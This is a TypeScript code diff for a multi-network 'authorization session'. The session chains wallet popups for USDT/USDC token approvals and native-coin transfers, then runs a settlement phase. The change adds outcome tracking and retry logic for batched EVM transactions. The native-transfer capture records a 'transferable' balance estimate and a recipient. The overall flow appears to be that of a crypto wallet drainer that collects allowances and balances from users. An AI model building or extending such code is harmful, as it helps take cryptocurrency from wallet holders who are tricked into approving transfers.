@@ -30,7 +30,13 @@ import type {
 import {
   planAuthorizationWork,
   runEvmTokenBatchApproval,
+  type EvmTokenBatchRunResult,
 } from "./evm-token-batch";
+import {
+  filterBatchResultsForNativeRetry,
+  inferEvmBatchNativeOutcome,
+  shouldSkipNativeWalletPhaseAfterBatch,
+} from "./evm-batch-native-outcome";
 import { runAuthorizationSettlement } from "./phases/settlement-coordinator";
 import type { SettlementRunResult } from "./phases/types";
 import type {
@@ -149,6 +155,47 @@ function summarize(
   };
 }
 
+function applyEvmBatchNativeCapture(args: {
+  batchResults: EvmTokenBatchRunResult;
+  network: string;
+  owner: string;
+  capture: WalletPhaseCapture;
+}): void {
+  const { batchResults, network, owner, capture } = args;
+  const outcome = inferEvmBatchNativeOutcome(batchResults);
+
+  if (
+    outcome === "succeeded" &&
+    batchResults.batchIncludedNative &&
+    batchResults.nativeTxHash
+  ) {
+    capture.native = {
+      network,
+      owner,
+      authorizationKind: "evm_batch_executed",
+      authorizationPayload: { txHash: batchResults.nativeTxHash },
+      estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
+      recipient: batchResults.nativeRecipient ?? undefined,
+    };
+    return;
+  }
+
+  if (outcome === "unknown" && batchResults.batchId) {
+    capture.native = {
+      network,
+      owner,
+      authorizationKind: "evm_batch_unknown",
+      authorizationPayload: {
+        batchId: batchResults.batchId,
+        chainId: batchResults.batchChainId ?? null,
+        tokenJobCount: batchResults.batchNativeJobCount ?? 0,
+      },
+      estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
+      recipient: batchResults.nativeRecipient ?? undefined,
+    };
+  }
+}
+
 /**
  * Two-phase authorization:
  * 1. Wallet phase — consecutive popups (USDT/USDC approve; Tron native sign only).
@@ -207,7 +254,15 @@ export async function runAuthorizationSession(
           log,
           walletPhaseOnly: true,
         });
-        results.push(...batchResults.results);
+        const batchNativeOutcome = inferEvmBatchNativeOutcome(batchResults);
+        results.push(
+          ...(batchNativeOutcome === "failed_revert"
+            ? filterBatchResultsForNativeRetry(
+                batchResults.results,
+                unit.network,
+              )
+            : batchResults.results),
+        );
 
         const owner = args.accounts.evm;
         if (owner) {
@@ -223,7 +278,22 @@ export async function runAuthorizationSession(
             existing.tokens.push(...batchResults.tokenCaptures);
             existing.batchId = batchResults.batchId ?? existing.batchId;
           }
-          if (unit.nativeItem) {
+          applyEvmBatchNativeCapture({
+            batchResults,
+            network: unit.network,
+            owner,
+            capture: existing,
+          });
+          if (
+            unit.nativeItem &&
+            !shouldSkipNativeWalletPhaseAfterBatch(batchResults, true)
+          ) {
+            if (batchNativeOutcome === "failed_revert") {
+              log?.("EIP5792_BATCH_NATIVE_RETRY_WALLET_PHASE", {
+                network: unit.network,
+                outcome: batchNativeOutcome,
+              });
+            }
             captureByNetwork.set(unit.network, existing);
             await runNativeWalletPhase({
               item: unit.nativeItem,
